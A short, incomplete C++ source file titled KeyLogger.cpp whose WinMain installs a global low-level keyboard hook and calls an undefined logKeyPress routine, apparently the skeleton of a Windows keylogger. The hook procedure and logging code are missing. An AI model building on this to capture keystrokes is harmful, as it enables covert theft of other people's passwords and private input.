// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
	HHOOK hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
	logKeyPress();

}

